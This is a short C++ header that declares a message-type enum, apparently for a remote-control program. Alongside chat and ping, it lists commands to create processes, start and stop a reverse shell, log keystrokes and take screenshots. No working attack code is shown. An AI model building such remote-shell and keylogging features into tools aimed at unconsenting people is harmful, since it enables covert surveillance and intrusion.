#pragma once

enum class MessageType : char
{
	Chat,
	Ping,
	CreateProcessS,
	StartReverseShell,
	ReverseShellMessage,
	StopReverseShell,
	KeyLog,
	TakeScreenshot,
	Screenshot
};